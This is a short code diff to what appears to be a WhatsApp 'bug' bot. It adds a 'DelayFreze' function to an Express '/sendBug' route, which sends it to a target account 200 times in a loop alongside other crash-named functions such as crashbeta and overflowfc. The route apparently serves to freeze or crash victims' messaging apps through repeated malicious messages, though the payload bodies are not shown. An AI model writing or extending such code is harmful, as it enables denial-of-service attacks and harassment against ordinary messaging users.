@@ -10,6 +10,7 @@ const {
   disconnectAllActiveConnections,
   // Bug functions
   bleng,
+  DelayFreze,
   crashbeta,
   overflowfc,
   blankmsg,
@@ -317,13 +318,9 @@ router.get("/sendBug", async (req, res) => {
       switch (bug) {
 
         // ── BUGS ──
-        case "AhhCrot":
+        case "DelayFreze":
           for (let i = 0; i < 200; i++) {
-            await AhhCrot(sock, targetJid);
-            await sleep(1500);
-            await bleng(sock, targetJid);
-            await sleep(1500);
-            await denglay(sock, targetJid);
+            await DelayFreze(sock, target);
             await sleep(1500);
           }
           break;
